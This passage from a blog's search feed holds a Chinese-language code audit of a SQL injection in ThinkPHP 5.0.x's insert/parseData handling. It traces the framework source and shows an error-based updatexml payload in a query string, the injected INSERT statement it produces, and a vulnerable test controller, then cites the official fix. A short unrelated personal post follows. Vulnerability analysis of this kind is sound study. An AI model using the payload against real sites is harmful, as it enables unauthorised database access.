invoke__">array_keys</span>(<span class="variable">$data</span>);    <span class="comment">#以数组形式返回$data数组的键</span></span><br><span class="line">        <span class="variable">$values</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$data</span>);  <span class="comment">#以数组形式放回$data数组的值</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">            [<span class="string">&#x27;%INSERT%&#x27;</span>, <span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%DATA%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>],</span><br><span class="line">            [</span><br><span class="line">                <span class="variable">$replace</span> ? <span class="string">&#x27;REPLACE&#x27;</span> : <span class="string">&#x27;INSERT&#x27;</span>,</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$fields</span>),</span><br><span class="line">                <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$values</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            ], <span class="variable">$this</span>-&gt;insertSql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先转到看一下数据的解析<code>$data = $this-&gt;parseData($data, $options)</code></p><p>假设我们传入的是<code>?name[0]=username&amp;name[1]=password&amp;name[2]=123456</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取绑定信息</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getFieldsBind</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$bind</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = [];</span><br><span class="line">  <span class="comment">#这里遍历了数组 此时的数组是Array ( [username] =&gt; Array ( [0] =&gt; username [1] =&gt; password [2] =&gt; 123456 ) ) </span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="comment">#$key username</span></span><br><span class="line">            <span class="comment">#$val Array ( [0] =&gt; username [1] =&gt; password [2] =&gt; 123456 ) </span></span><br><span class="line">            <span class="variable">$item</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>, <span class="variable">$options</span>);</span><br><span class="line">            <span class="comment">#$item=`username`</span></span><br><span class="line">            <span class="comment">#这里的$val是数组所以跳过</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$val</span>, <span class="string">&#x27;__toString&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 对象数据写入</span></span><br><span class="line">                <span class="variable">$val</span> = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#如果字段名含有.或者字段名不在$fileds则报错</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;strict&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;fields not exists:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$val</span>)) &#123; <span class="comment">#跟进到这里</span></span><br><span class="line">                <span class="comment">#这里如果$val[0]的值是下面三个中的一个则进行了拼接</span></span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="comment">// 过滤非标量数据</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">isBind</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$key</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&#x27;data__&#x27;</span> . <span class="variable">$key</span>, <span class="variable">$val</span>, <span class="keyword">isset</span>(<span class="variable">$bind</span>[<span class="variable">$key</span>]) ? <span class="variable">$bind</span>[<span class="variable">$key</span>] : PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;:data__&#x27;</span> . <span class="variable">$key</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>自己大概捋了一下思路 感觉已经知道了注入的顺序了 接下来就是待入payload梳理一下</p><p>这里用七月火师傅给的payload <code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code></p><p>接下来动态调试一下</p></li></ol><h3 id="1-入口函数"><a href="#1-入口函数" class="headerlink" title="1. 入口函数"></a>1. 入口函数</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190254568.png" alt="image-20211122190254568"></p><h3 id="2-跟进到insert函数"><a href="#2-跟进到insert函数" class="headerlink" title="2. 跟进到insert函数"></a>2. 跟进到insert函数</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190932980.png" alt="image-20211122190932980"></p><p>在红线的地方进行了一次解析,这次解析和漏洞关系不大,只是解析了当前sql语句或者这里应该称之为表达式进行了一次解析,主要内容就是,表名,字段名这些获得的结果如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$options</span>:</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [table] =&gt; users [multi] =&gt; <span class="title function_ invoke__">Array</span> ( [AND] =&gt; <span class="title function_ invoke__">Array</span> ( [id] =&gt; <span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) ) ) [where] =&gt; <span class="title function_ invoke__">Array</span> ( [AND] =&gt; <span class="title function_ invoke__">Array</span> ( [id] =&gt; <span class="number">1</span> ) ) [field] =&gt; * [data] =&gt; <span class="title function_ invoke__">Array</span> ( ) [strict] =&gt; <span class="number">1</span> [master] =&gt; [lock] =&gt; [fetch_pdo] =&gt; [fetch_sql] =&gt; [distinct] =&gt; [join] =&gt; [union] =&gt; [group] =&gt; [having] =&gt; [limit] =&gt; [order] =&gt; [force] =&gt; [comment] =&gt; ) </span><br></pre></td></tr></table></figure><p>在接下来的地方执行了array_merge()函数,把两个数组合并成一个数组,并赋值给$data</p><p>此时$options[‘data’]为空,而$data就是我们想要插入的键值对</p><p>接下来才是最重要的</p><h3 id="3-builder-php-x2F-insert"><a href="#3-builder-php-x2F-insert" class="headerlink" title="3. builder.php&#x2F;insert()"></a>3. builder.php&#x2F;insert()</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122211516906.png" alt="image-20211122211516906">在这里就要跟进到builder类的insert()函数了,这个函数的功能是<strong>拼接出最后要执行SQL语句</strong></p><p><strong>所以要特别关注这个函数</strong></p><p>这里注意的是builder并非是builder类的实例化对象,而是Mysql类的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586782016-64ceefb6-bd92-4a90-9197-ccd16a64f272.png" alt="图片.png"></p><p>只是在这里的Mysql类继承了Builder类所以存在insert()函数,废话不多说直接看insert()函数</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586806130-e59464d6-f8b9-4ff9-af73-960efb2613ba.png" alt="图片.png"></p><p>这里直接执行了一个parseData()函数继续跟进,这就就是漏洞的点了,打气精神来 everybody!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取绑定信息</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getFieldsBind</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$bind</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$val</span>);</span><br><span class="line">            <span class="variable">$item</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>, <span class="variable">$options</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$val</span>, <span class="string">&#x27;__toString&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 对象数据写入</span></span><br><span class="line">                <span class="variable">$val</span> = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;strict&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;fields not exists:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;result:&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">print_r</span>(<span class="variable">$result</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="comment">// 过滤非标量数据</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">isBind</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$key</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&#x27;data__&#x27;</span> . <span class="variable">$key</span>, <span class="variable">$val</span>, <span class="keyword">isset</span>(<span class="variable">$bind</span>[<span class="variable">$key</span>]) ? <span class="variable">$bind</span>[<span class="variable">$key</span>] : PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;:data__&#x27;</span> . <span class="variable">$key</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先执行了一个<code>$bind = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);</code>这个函数的具体流程还不清楚</p><p>但是返回的值是这样的<code>Array (    [id] =&gt; 1    [username] =&gt; 2    [password] =&gt; 2 )</code></p><p>暂且可以理解为是以数组的形式返回数据库的字段名(90%的确定!)</p><p>接着就是<code>$fields = array_keys($bind);</code>将$bind数组的键以一个新的数组赋值到$fields</p><h3 id="4-foreach-生成sql语句"><a href="#4-foreach-生成sql语句" class="headerlink" title="4. foreach()生成sql语句"></a>4. foreach()生成sql语句</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587324239-15ad0a71-8ec0-410b-a600-3899a308c822.png" alt="图片.png"></p><p>此时键值$key是username $val是一个数组在图中已经给出来了</p><p>而$item在parseKey解析后值是变为`username`</p><p>下面的if由于不是对象直接跳过,直接运行到</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587378450-963c32a2-e59a-4017-b7d9-0f58adbffe19.png" alt="图片.png"></p><p>此时$val[0]的值是inc直接跳到case inc:执行下面的语句</p><p>通过拼接<code>$result[$item]=updatexml(1,concat(0x7,user(),0x7e),1)+1</code></p><p>而reuslt的数组的值就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span> ( [`username`] =&gt; <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)+<span class="number">1</span> ) </span><br></pre></td></tr></table></figure><p>返回result数组到insert()函数</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587425904-f1872ee2-e34d-4204-ae67-349b1bbd833b.png" alt="图片.png"></p><p>初始定义<code>protected $insertSql = &#39;%INSERT% INTO %TABLE% (%FIELD%) VALUES (%DATA%) %COMMENT%&#39;;</code></p><p>经过解析后变为sql语句变为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` (`username`) <span class="keyword">VALUES</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">+</span><span class="number">123456</span>) </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587444264-8982234a-14ec-4f6f-889f-821c233fea94.png" alt="图片.png"></p><p>由于在红线的地方执行sql语句的时候由于updatexml而产生报错</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ol><li><p>这里漏洞的第一参数name[0]可以修改为dec可以 但是exp我复现失败了 后面回补充完整!</p></li><li><p>第一次审计TP框架,可能审计的不够完美,希望大家多多包涵!</p></li><li><p>本文参考七月火师傅的博客</p><p><a href="%22https://mochazz.github.io/2018/04/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%20ThinkPHP%205.0.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/#ThinkPHP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%22">1. 代码审计 | ThinkPHP5.0.x框架SQL注⼊-七月火师傅</a></p><p><a href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b">2. 官方漏洞修复</a></p></li><li><p>后来发现如果name[0]&#x3D;exp 经过处理之后值</p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122233302725.png" alt="image-20211122233302725"  /><p>$val[0]&#x3D;’exp ‘所以没有匹配到,但是inc和dec却没有加一个trim,所以跟进了一下</p><p>在这里打了一下dump($val[0]);值是<code>string &#39;exp &#39; (length=4)</code></p><p>我在这里一个一个尝试了一下 最后发现</p><p>在入口函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;get.name/a&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">dump</span>(<span class="variable">$name</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&quot;users&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&quot;id&quot;</span>=&gt;<span class="number">1</span>])-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$name</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ThinkPHP SQL Test.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里打出$name[0],如果传的是exp就多了一个空格,如果是inc就没有添加空格</p><p>最后在这个目录下发现了一个函数 日!</p><p><code>\thinkphp\library\think\Request.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterExp</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>G!</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> thinkphp框架安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ilove wyw</title>
      <link href="/2023/03/21/ilove-wyw/"/>
      <url>/2023/03/21/ilove-wyw/</url>
      
        <content type="html"><![CDATA[<p>傻逼!</p>]]></content>
      
      
      <categories>
          
          <category> 成长 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成长 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
